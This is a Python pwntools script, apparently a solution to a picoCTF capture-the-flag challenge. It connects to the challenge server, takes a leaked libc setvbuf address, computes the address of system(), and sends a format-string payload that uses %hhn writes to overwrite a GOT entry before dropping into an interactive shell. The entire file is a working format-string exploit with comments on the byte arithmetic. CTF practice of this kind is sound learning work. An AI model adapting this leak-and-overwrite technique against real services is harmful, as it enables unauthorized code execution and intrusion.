from pwn import *

io = remote('rhea.picoctf.net', 60915)
context.log_level = 'debug'
print(io.recvuntil('in libc: '))
setvbuf_addr = io.recvuntil('\n', drop=True)
print(setvbuf_addr)      
system_addr = hex(int(setvbuf_addr[2:],16)-0x2ac90)[2:]   # first [2:] removes the '0x' by converting a bytes object to a string object for manipulation, nice!   
print(system_addr)

byte3 = int(system_addr[6:8],16)               # decimal values for %hhn character count
byte2 = int(system_addr[8:10],16)
byte1 = int(system_addr[10:12],16)           # always 96 (0x60) so no calculation required 
filler1 = (byte2 - byte1)%256 - 4                  # -4 accounts for ,ZZ, characters in payload 
filler2 = (byte3 - byte2)%256 - 4    

payload = '' 
payload += '%92cZZZ,%44$hhn,'                 # 92 characters plus ZZZ, gives 96 
payload += '%' + '%03d'%filler1 + 'cZZ,' + '%45$hhn,'
payload += '%' + '%03d'%filler2 + 'cZZ,' + '%46$hhn,'
payload += '\x18\x40\x40\x00\x00\x00\x00\x00\x19\x40\x40\x00\x00\x00\x00\x00\x1a\x40\x40\x00\x00\x00\x00\x00'
print(payload)
io.sendline(payload)
io.interactive()